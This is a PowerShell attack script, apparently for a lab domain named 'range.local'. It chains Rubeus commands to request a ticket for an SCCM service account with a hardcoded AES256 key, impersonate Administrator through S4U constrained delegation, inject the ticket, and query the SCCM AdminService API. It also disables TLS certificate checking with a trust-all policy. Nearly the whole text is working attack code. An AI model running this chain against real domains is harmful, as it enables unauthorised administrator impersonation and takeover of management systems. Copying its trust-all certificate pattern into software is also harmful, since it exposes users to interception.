# WT037 via CD chain: svc_sccm -> s4u as Administrator -> HTTP/mbr02.range.local -> AdminService CMPivot
# analyst_t1 (ATTACK from ws01)
$ErrorActionPreference = 'Stop'
$rubeus = 'C:\Tools\ADTools\Rubeus.exe'
$mp = 'mbr02.range.local'
$resourceId = 16777219
$dc = 'dc03.range.local'
$tgtOut = 'C:\Users\analyst_t1\svc_sccm.tgt.kirbi'

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy6 : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy6

Write-Output '=== [1] asktgt as svc_sccm (AES256, realm range.local) ==='
& $rubeus asktgt /user:svc_sccm /domain:range.local /aes256:54D4BFDC9CD3B8885E6EEE6AA2AC04058C80D57D13EA70708CF7ABECB1927012 /dc:$dc /outfile:$tgtOut 2>&1 | Select-Object -Last 8

Write-Output ''
Write-Output '=== [2] s4u as Administrator -> HTTP/mbr02.range.local (ptt) ==='
& $rubeus s4u /ticket:$tgtOut /impersonateuser:Administrator /msdsspn:HTTP/mbr02.range.local /altservice:HTTP /ptt /dc:$dc 2>&1 | Select-Object -Last 12

Write-Output ''
Write-Output '=== [3] klist (verify ST) ==='
klist 2>&1 | Select-Object -Last 15

Write-Output ''
Write-Output '=== [4] AdminService Device read with ST (no -Credential) ==='
$u = "https://$mp/AdminService/v1.0/Device($resourceId)"
try {
  $r = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 30
  Write-Output ("OK " + $r.StatusCode + " :: " + $r.Content.Substring(0, [Math]::Min(1200, $r.Content.Length)))
} catch {
  $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
  Write-Output ("ERROR $code : " + $_.Exception.Message)
}
Write-Output 'CD_STAGE1_DONE'
